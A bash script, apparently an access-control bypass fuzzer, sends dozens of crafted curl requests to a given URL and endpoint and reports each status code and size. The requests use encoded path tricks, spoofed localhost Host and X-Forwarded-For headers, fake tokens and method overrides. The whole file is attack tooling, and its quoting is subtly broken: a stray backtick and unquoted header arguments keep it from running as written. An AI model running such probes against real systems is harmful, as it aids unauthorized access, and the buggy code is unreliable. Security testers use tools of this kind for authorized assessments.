#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <base_url> <endpoint>"
    exit 1
fi

declare -a curl_payloads=(
    # Existing Bypasses
    "$1/$2%5c"
    "$1/$2%2F"
    "$1/$2+"
    "-H \"Range: bytes=0-10\" $1/$2"
    "-H \"Accept-Encoding: gzip,deflate\" $1/$2"
    "-H \"X-Original-Host: malicious.com\" $1/$2"
    "$1/$2`"
    "-X PATCH $1/$2"
    "-H \"Authorization: Bearer some_token\" $1/$2"
    "$1/%09$2"
    "$1/$2%00"
    "$1/$2,%00"
    "$1/$2/..//..//"
    "$1/$2/?v=1/"
    "-H \"Connection: Upgrade\" -H \"Upgrade: websocket\" $1/$2"
    "-H \"If-None-Match: some-etag-value\" $1/$2"
    "$1/$2~"
    "-H \"X-Forwarded-Proto: https\" $1/$2"
    "-H \"Accept: */*\" $1/$2"
    "-H \"Expect: 100-continue\" $1/$2"

    # New Bypasses
    "-H \"Referer: http://localhost\" $1/$2"
    "-H \"Host: 127.0.0.1\" $1/$2"
    "$1/$2."
    "$1/$2;/"
    "-X GET $1/$2"
    "$1/$2?"
    "-b \"cookie=\" $1/$2"
    "-X OPTIONS $1/$2"
    "-H \"Origin: http://trusted.com\" $1/$2"
    "-H \"X-Forwarded-For: 127.0.0.1\" $1/$2"
    "-A \"\" $1/$2"
    "$1/$2%2520"
    "-X HEAD $1/$2"
    "-H \"Transfer-Encoding: chunked\" $1/$2"
    "$1/$2%23"
    "-H \"Proxy-Authorization: Basic dXNlcjpwYXNz\" $1/$2"
    "http://subdomain.$1/$2"
    "$1/$2%7C"
    "-H \"Authorization: Bearer fake_token\" $1/$2"
    "-H \"Host: [::1]\" $1/$2"
    "$1/$2%26"
    "-H \"Content-Type: application/json\" -H \"Accept: application/json\" $1/$2"
    "$1/$2%2C"
    "-H \"X-HTTP-Method-Override: PUT\" $1/$2"
    "$1/$2/"
)

# Execute each curl payload and display HTTP response code and download size
for payload in "${curl_payloads[@]}"; do
    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $payload)
    echo "$response  --> $payload"
done
